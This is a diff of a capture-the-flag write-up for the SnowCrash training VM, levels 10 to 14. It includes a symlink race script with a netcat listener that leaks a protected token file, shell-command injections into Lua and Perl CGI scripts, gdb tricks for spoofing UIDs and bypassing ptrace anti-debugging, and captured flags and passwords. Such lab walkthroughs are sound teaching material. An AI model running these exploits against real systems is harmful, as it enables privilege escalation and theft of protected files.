@@ -476,182 +476,437 @@ Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z
 
 # Level10
 
-Level10
+When we log in as the level10 user, we get two files:
 
-Access the file.
-
-When we login as level10 user we get the following files :
-
-level10@SnowCrash:~$ ls -l
-total 16
+```
 -rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
 -rw-------  1 flag10 flag10     26 Mar  5  2016 token
-
-We do not have access to the file token. When we execute the binary level10 we get the folloing  result :
-
-level10@SnowCrash:~$ ./level10 
-./level10 file host
-        sends file to host if you have access to it
-
-It seems to expect some arguments. one file name and a host such as an ip address of a host
-
-so we try the folloing
-
-level10@SnowCrash:~$ ./level10 token localhost
-You don't have access to token
-
-level10@SnowCrash:~$ ./level10 /bin/ls localhost
-Connecting to localhost:6969 .. Unable to connect to host localhost
-
-It seems that the file do not let us see the content of token and if we do put a file that it excepts we neet to have a receaver for this file, specially on port 6969.
-
-When we decompile the binary we get the following result :
-```sh
-int main(int argc, char ** argv) {
-    char buffer[4096]; // bp-4132
-    int32_t v1 = (int32_t)argv; // 0x80486e0
-    int32_t v2 = __readgsdword(20); // 0x80486e7
-    if (argc <= 2) {
-        int32_t v3 = *(int32_t *)argv; // 0x8048700
-        printf("%s file host\n\tsends file to host if you have access to it\n", (char *)v3);
-        exit(1);
-        // UNREACHABLE
-    }
-    int32_t * path = (int32_t *)(: + 4); // 0x8048723
-    char * path2 = (char *)*path; // 0x8048726
-    char * cp = (char *)*(int32_t *)(v1 + 8); // 0x8048731
-    int32_t chars_printed;
-    int32_t result; // 0x804896b
-    int32_t * v4;
-    if (access((char *)*path, R_OK) != 0) {
-        // 0x8048940
-        chars_printed = printf("You don't have access to %s\n", path2);
-        // branch -> 0x8048955
-        // 0x8048955
-        if (v2 == __readgsdword(20)) {
-            // 0x8048955
-            result = chars_printed;
-            // branch -> 0x804896a
-        } else {
-            // 0x8048965
-            __stack_chk_fail();
-            result = (int32_t)&v4;
-            // branch -> 0x804896a
-        }
-        // 0x804896a
-        return result;
-    }
-    // 0x8048756
-    printf("Connecting to %s:6969 .. ", cp);
-    fflush((struct _IO_FILE *)g1);
-    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x804878f
-    int32_t sin = 2; // bp-36
-    inet_addr(cp);
-    htons(0x1b39);
-    if (connect(sock_fd, (struct sockaddr *)&sin, 16) == -1) {
-        // 0x804880f
-        printf("Unable to connect to host %s\n", cp);
-        exit(1);
-        // UNREACHABLE
-    }
-    // 0x8048830
-    if (write(sock_fd, (int32_t *)".*( )*.\n", 8) == -1) {
-        // 0x8048851
-        printf("Unable to write banner to host %s\n", cp);
-        exit(1);
-        // UNREACHABLE
-    }
-    // 0x8048872
-    printf("Connected!\nSending file .. ");
-    fflush((struct _IO_FILE *)g1);
-    int32_t fd = open(path2, O_RDONLY); // 0x804889b
-    if (fd == -1) {
-        // 0x80488ab
-        puts("Damn. Unable to open file");
-        exit(1);
-        // UNREACHABLE
-    }
-    // 0x80488c3
-    int32_t nbyte = read(fd, (int32_t *)&buffer, 0x1000); // 0x80488da
-    if (nbyte == -1) {
-        int32_t err_num = *__errno_location(); // 0x80488ef
-        printf("Unable to read from file: %s\n", strerror(err_num));
-        exit(1);
-        // UNREACHABLE
-    }
-    // 0x8048916
-    write(sock_fd, (int32_t *)&buffer, nbyte);
-    chars_printed = puts("wrote file!");
-    // branch -> 0x8048955
-    // 0x8048955
-    if (v2 == __readgsdword(20)) {
-        // 0x8048955
-        result = chars_printed;
-        // branch -> 0x804896a
-    } else {
-        // 0x8048965
-        __stack_chk_fail();
-        result = (int32_t)&v4;
-        // branch -> 0x804896a
-    }
-    // 0x804896a
-    return result;
-}
 ```
-It seems the file checks the access of the path that we provile and if the result is OK the program creates a TCP Socket and sends the file to cloent. There is nothing too complicated.
 
-In the man page of access we have a Warning it says :
+We don’t have access to the `token` file.
 
-    Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided. (In the example just described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)
+Running `./level10` shows it expects two arguments: a file and a host (looks like an IP).
 
-So it seems that the access function is not very secure because it is possible to exploit this function by providing a file to which we have access and once the check for Access is done if we are quick and we replace it with some other file that file will be consider valide.
+Trying `./level10 token localhost` says we don’t have access to token.
 
-So in this situation what we can do is
+Trying with something we can access (like `/bin/ls`) shows that it wants to connect on port 6969:
 
-    make a way to replace the file quickly enough so that we can pass the access check and the executable reads the replaced file
+```
+Connecting to localhost:6969 .. Unable to connect to host localhost
+```
 
-    Create a process to receave the file that will be send by the level10 executable.
+## Dynamic Behavior
 
-I have created a simple script that creates a random file that we an acces and replace it with the token file
-```sh
+So the binary:
+
+1. Checks access to the file.
+2. If OK, connects to the host on TCP port 6969.
+3. Sends the file.
+
+We used `ltrace` to figure this out — no need to decompile anything.
+
+## The Race Condition
+
+The key is the `access()` check. It checks if we can read the file before opening it.
+
+From the man page:
+
+> Using access() to check if a user is authorized to open a file before actually doing so creates a security hole...
+
+So we abuse that.
+
+## The Exploit
+
+We:
+
+1. Create a file we *do* have access to.
+2. Symlink to that file.
+3. Right after `access()` runs, we swap the symlink to point to the `token` file.
+4. `open()` doesn’t re-check permissions, so it reads the token.
+
+### Script: `exploit.sh`
+
+```bash
 #!/bin/bash
 
-# This file will be reserved so even if the link is deleted the file will stay
 random_file=$(head -c 500 /dev/urandom | tr -dc 'a-zA-Z0-9~!@#$%^&*_-' | fold -w 25 | head -n 1)
-
-# Crate a file with a random name
 touch /tmp/$random_file
 
-# This name will be used to create the symbolic link.
 link_name=$(head -c 500 /dev/urandom | tr -dc 'a-zA-Z0-9~!@#$%^&*_-' | fold -w 25 | head -n 1)
 
 while true
 do
-        /home/user/level10/level10 /tmp/$link_name 127.0.1 &> /dev/null
+    /home/user/level10/level10 /tmp/$link_name 127.0.1 &> /dev/null
 done &
 
 while true
 do
-        ln -fs /home/user/level10/token /tmp/$link_name
-        ln -fs /tmp/$random_file /tmp/$link_name
+    ln -fs /home/user/level10/token /tmp/$link_name
+    ln -fs /tmp/$random_file /tmp/$link_name
 done
 ```
 
-we can create and save this file in /tmp directory.
+Save and run this in one terminal.
 
-Now what we need is a server that can accept TCP requests. And netcat can listen to a certain port and accept data from client.
-```sh
-## We are looping because it is possible that it doesn't work
-## in the first try.
-while true;  do nc.traditional -l -p 6969 | grep -v '.*( )*.' ; done
+### Listener: `netcat`
+
+In another terminal:
+
+```bash
+while true; do nc.traditional -l -p 6969 | grep -v '.*( )*.' ; done
 ```
-nc.traditional is just an other version of netcat (nc) where we can use the -p option to specify the port number to listen to. In the nc (the version provided in the ISO) it takes the port number as the last command line argument passed.
 
-In my case the best way to perform the job to get the flag was to execute the netcat loop in one terminal and the getflag.sh script in another and when we execute both of the script we get the flag from netcat
+Eventually, the race wins and the token content is printed.
 
-level10@SnowCrash:~$ while true;  do nc.traditional -l -p 6969 | grep -v '.*( )*.' ; done
+## Result
+
+```
 woupa2yuojeeaaed06riuj63c
+```
 
-Password for next level
+### Next Level Password
 
-The Password to connect to the account level11 is feulo4b72j7edeahuete3no7c
+```
+feulo4b72j7edeahuete3no7c
+```
+# Level11
+
+When we log in as `level11`, we see a Lua script `level11.lua` sitting in the home directory:
+
+```bash
+level11@SnowCrash:~$ ls
+level11.lua
+```
+
+We crack it open and here's what we're working with:
+
+```lua
+#!/usr/bin/env lua
+local socket = require("socket")
+local server = assert(socket.bind("127.0.0.1", 5151))
+
+function hash(pass)
+  prog = io.popen("echo "..pass.." | sha1sum", "r")
+  data = prog:read("*all")
+  prog:close()
+
+  data = string.sub(data, 1, 40)
+
+  return data
+end
+
+while 1 do
+  local client = server:accept()
+  client:send("Password: ")
+  client:settimeout(60)
+  local l, err = client:receive()
+  if not err then
+      print("trying " .. l)
+      local h = hash(l)
+
+      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
+          client:send("Erf nope..\n");
+      else
+          client:send("Gz you dumb*\n")
+      end
+  end
+  client:close()
+end
+```
+
+Okay, so the Lua script is just spinning up a TCP server on `localhost:5151`, waiting for input, and checking if the SHA1 of the input matches a hardcoded hash. If it does, you win. If it doesn’t, it just insults you and closes the connection.
+
+### Things to Notice
+
+This line is interesting:
+
+```lua
+prog = io.popen("echo "..pass.." | sha1sum", "r")
+```
+
+No sanitization. No escaping. Just raw user input piped into `echo` inside `io.popen`. Classic command injection territory.
+
+### First Exploit Attempt
+
+We tried:
+
+```bash
+nc localhost 5151
+Password: ; getflag ;
+Erf nope..
+```
+
+Didn’t work. But the idea is right. The input is being used inside a shell.
+
+Eventually, the right move was:
+
+```bash
+nc localhost 5151
+Password: ; getflag > /tmp/flag
+Erf nope..
+```
+
+Now:
+
+```bash
+cat /tmp/flag
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+```
+
+And that’s the password for the next level.
+
+### Summary
+
+The script is vulnerable to command injection through the way it hashes user input using `io.popen` and `echo`. By injecting shell commands in the password field, we can trigger command execution and extract the flag.
+
+Token for level12: **`fa6v5ateaw21peobuub8ipe6s`**
+
+# SnowCrash
+
+We log into the `level12` user and see only one file waiting for us:
+
+```bash
+level12@SnowCrash:~$ ls
+level12.pl
+```
+
+Peeking inside:
+
+```perl
+#!/usr/bin/env perl
+# localhost:4646
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+
+sub t {
+  $nn = $_[1];
+  $xx = $_[0];
+  $xx =~ tr/a-z/A-Z/; 
+  $xx =~ s/\s.*//;
+  @output = `egrep "^$xx" /tmp/xd 2>&1`;
+  foreach $line (@output) {
+      ($f, $s) = split(/:/, $line);
+      if($s =~ $nn) {
+          return 1;
+      }
+  }
+  return 0;
+}
+
+sub n {
+  if($_[0] == 1) {
+      print("..");
+  } else {
+      print(".");
+  }    
+}
+
+n(t(param("x"), param("y")));
+```
+
+It's a basic Perl CGI script running a local web server on port 4646. Here's what we know:
+
+- It uses `param("x")` and `param("y")` to grab values from the URL.
+- Then it:
+  - UPPERCASES `x`
+  - Removes everything in `x` after the first whitespace
+  - Uses `egrep "^$x"` on `/tmp/xd` and then loops through matches
+  - If any match's second field matches `y`, it returns 1, and the function prints `..`
+  - Otherwise, just prints "."
+
+So far, so good. But there's a crucial part: this line:
+
+```perl
+@output = `egrep "^$xx" /tmp/xd 2>&1`;
+```
+
+The backticks mean it's **executing shell code**.
+
+
+
+Classic command injection. Since the input is unsanitized, we can just drop in a payload and execute arbitrary shell.
+
+### Payload Strategy
+
+We’re gonna:
+
+1. Create a script in `/tmp` that calls `getflag` and saves the result (since the program turns everything into uppercase let's make it uppercase).
+2. Inject the script name into the vulnerable `x` parameter.
+3. Read the output file.
+
+```bash
+echo '#!/bin/sh' > /tmp/GETFLAG
+echo 'getflag > /tmp/flag' >> /tmp/GETFLAG
+chmod +x /tmp/GETFLAG
+```
+
+Now trigger it:
+
+```bash
+curl '127.0.0.1:4646?x=$(`/*/GETFLAG`)'
+```
+
+It runs, Perl happily shells out and runs our script.
+
+Let’s grab the flag:
+
+```bash
+cat /tmp/flag
+```
+
+Boom:
+
+```
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+```
+
+## Flag
+
+**g1qKMiRpXf53AWhDaU7FEkczr**
+
+On to the next one.
+
+# Level 13
+
+So we’ve made it to level 13, and the binary here is doing its best imitation of airport security: it doesn’t let you in unless you show the right ID. Literally.
+
+
+There’s a binary called `level13` with the `setuid` bit set… but it’s owned by `flag13`, not us. Running it gives:
+
+```
+UID 2013 started us but we we expect 4242
+```
+
+So we need to impersonate 4242...
+
+We pop in `ltrace` and confirm what we suspect:
+
+```
+getuid() = 2013
+getuid() = 2013
+UID 2013 started us but we we expect 4242
+```
+
+Yep, double `getuid()`, no lies. It expects UID 4242.
+
+But there’s no sudo, no suid helper, no nothing… so how do we fake it?
+
+## 🛠 The Exploit: Jedi Mind Trick with GDB
+
+We run the binary under `gdb`, set a breakpoint at `getuid`, then Jedi-mind-trick it into believing we’re 4242:
+
+```gdb
+b getuid
+r
+print $eax        # Shows 2013
+set $eax=4242     # Change it to what the binary wants
+n                 # Let it rip
+```
+
+And boom:
+
+```
+your token is 2A31L79asukciNyi8uppkEuSx
+```
+
+## Takeaways
+
+- Binaries that trust `getuid()` can be fooled if you’re allowed to run them under `gdb`
+- UID spoofing with register manipulation works wonders when protections are lax
+- Don’t trust user IDs without actual authentication
+
+# Level 14
+
+
+At this stage, the challenge introduces a common anti-debugging mechanism using the ptrace system call. The getflag binary refuses to run properly if it detects being traced or debugged, which is a classic way to hinder reverse engineering. Your mission is to bypass this protection, manipulate process behavior using gdb, and retrieve the flag token for level14.
+Environment Overview
+
+    User: level14
+
+    Directory contents are minimal; no direct access to flag files via normal means.
+
+    The main executable to focus on is /bin/getflag.
+
+What Happens When Running getflag?
+
+When you try to run /bin/getflag, it immediately exits with the message:
+
+You should not reverse this
+
+This suggests some form of anti-debugging or anti-tracing mechanism is active.
+Understanding the Anti-Debugging Mechanism
+
+    The binary uses the ptrace system call to detect if it is being traced.
+
+    When ptrace returns -1, it indicates tracing is blocked or detected.
+
+    This causes the program to refuse to run normally.
+
+This is a typical approach in binaries that want to stop debuggers or monitoring tools from working on them.
+How to Bypass This Protection
+
+We use gdb to:
+
+    Catch the ptrace syscall:
+
+    Set a catchpoint on the ptrace syscall:
+
+catch syscall ptrace
+
+Force ptrace to return success:
+
+When the program tries to call ptrace, modify the return register (eax) to 0:
+
+- commands 1
+- set ($eax) = 0
+- continue
+- end
+
+This tricks the program into believing no debugger is attached.
+
+Manipulate the getuid() value:
+
+Set a breakpoint on getuid():
+
+- b getuid
+
+When hit, spoof the user ID from the real UID (2014) to the expected UID for the level (3014):
+
+    set $eax=3014
+
+Outcome
+
+After successfully bypassing the ptrace check and spoofing the UID, running getflag produces a valid token:
+
+Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
+
+This token confirms you have successfully solved the challenge.
+Additional Notes
+
+    Attempting to su flag14 initially failed, but after retrieving the correct token and authenticating properly, you gain access to the flag14 user shell.
+
+    This challenge is an excellent example of how anti-debugging techniques can be circumvented with basic debugging knowledge and system call manipulation.
+
+    The lesson here is to understand how to intercept syscalls with GDB and manipulate their return values to trick programs that rely on such checks.
+
+Quick Commands Recap
+
+gdb /bin/getflag
+
+(gdb) catch syscall ptrace
+
+(gdb) commands 1
+
+> set $eax = 0
+
+> continue
+
+> end
+
+(gdb) b getuid
+
+(gdb) run
+
+(gdb) set $eax=3014
+
+(gdb) continue
